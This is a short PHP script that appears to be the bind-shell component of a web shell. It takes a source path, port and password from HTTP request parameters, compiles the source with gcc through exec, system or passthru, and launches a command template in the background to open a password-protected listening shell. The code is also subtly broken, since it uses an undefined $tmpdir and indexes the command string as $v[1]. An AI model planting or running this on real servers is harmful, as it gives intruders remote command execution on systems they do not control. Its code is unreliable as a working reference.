<?php
$bind["src"] = $_GET['src'];
$bind["port"] = $_POST['port'];
$bind["pass"] = $_GET['pass'];
$v = $_REQUEST['v'];

function myshellexec($cmd)
{
    $result = "";
 
    if (is_callable("exec")){
		exec($cmd,$result); 
		$result = join("\n",$result);
	}
    elseif (is_callable("system")) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		system($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
	}
    elseif (is_callable("passthru")) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		passthru($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
	}
    return $result;
}
$w = explode(".",$bind["src"]);
$ext = $w[count($w)-1];

$srcpath = join(".",$w).".".rand(0,999).".".$ext;
$binpath = $tmpdir.join(".",$w).rand(0,999);

$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  
@unlink($srcpath);

$v = str_replace("%path",$binpath,$v);
$v = str_replace("%port",$bind["port"],$v);
$v = str_replace("%pass",$bind["pass"],$v);
$v = str_replace("//","/",$v[1]);

$retbind = myshellexec($v." > /dev/null &");
echo $retbind;
die("");
?>